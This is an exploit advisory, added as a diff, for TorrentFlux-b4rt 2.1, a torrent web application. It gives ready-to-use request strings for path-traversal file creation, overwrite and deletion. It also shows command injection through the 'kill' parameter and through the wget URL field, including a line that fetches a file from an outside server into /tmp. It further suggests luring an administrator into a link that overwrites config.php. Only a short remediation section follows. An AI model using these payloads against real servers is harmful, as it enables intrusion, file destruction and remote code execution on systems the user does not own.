@@ -1,0 +1,75 @@
+######################################################################################################
+#                                                                                                    #
+# TorrentFlux-b4rt 2.1 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablities #
+#                                                                                                    #
+######################################################################################################
+#                                                                                                    #
+# Software: TorrentFlux-b4rt 2.1                                                                     #
+#                                                                                                    #
+# Vendor: http://tf-b4rt.berlios.de/                                                                 #
+#                                                                                                    #
+# Released: 2006/11/15                                                                               #
+#                                                                                                    #
+# Discovered By: r0ut3r (writ3r [at] gmail.com)                                                      #
+#                                                                                                    #
+# Criticality: Highly critical                                                                       #
+#                                                                                                    #
+# Note: The information provided in this document is for TorrentFlux-b4rt administrator              #
+# testing purposes only!                                                                             #
+#                                                                                                    #
+######################################################################################################
+
+TorrentFlux-b4rt is built on TorrentFlux, although contains many new features, it is vulnerable to the same
+exploits as TorrentFlux 2.2, plus more. 
+
+   TorrentFlux-b4rt 2.1 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablity
+------------------------------------------------------------------------------------------------------
+
+alias_file = name of file you want to create. 
+delfile = name of file you want to remove
+
+-= To overwrite a file (make sure q.php is there, provided thats the file you want to overwrite): =-
+/torrentflux/index.php?alias_file=../../q.php&kill=3361&kill_torrent=q.torrent
+
+-= To create a file: =-
+/torrentflux/index.php?alias_file=q.php&kill=3361&kill_torrent=q.torrent
+
+All files are filled with: 
+0
+0
+Torrent Stopped
+
+-= Files can also be deleted like so: =-
+/torrentflux/index.php?alias_file=owned.php&kill=3361&delfile=owned.php
+
+-= Command Execution Exploit =-
+/torrentflux/index.php?alias_file=owned.php&kill=; echo "r0ut3r's TorrentFlux 0day" > /tmp/q.php&kill_torrent=q.torrent&return=true
+
+Replace kill parameter like so: 
+kill=; your command
+kill=; echo "r0ut3r just owned your system! hacked!" > /tmp/read_this.php
+
+The only draw back is that you have to be a registered member before you can access the functions of index.php. 
+Alternatively you could direct the administrator to a link which overwrites the config.php file, then catch the output on index.php somehow (be quick). 
+
+-= Command Execution Exploit 2 =-
+On the index page where it says "URL for the File to wget" you can exploit this by starting your command with a semicolon. 
+; cd /tmp; wget http://somewebserver/owned.txt
+
+Solution: 
+----------
+Sanitize all variables listed above and below. 
+alias_file
+delfile
+kill
+kill_torrent
+
+And sanitise the wget variables appropriately. 
+
+Solution 2: 
+-----------
+Set up .htaccess and only allow certain people to login until an offical patch is released. 
+
+----------------------------------------------------------------------------------------------
+              This has been another r0ut3r discovery (writ3r [ at ] gmail.com)
+----------------------------------------------------------------------------------------------
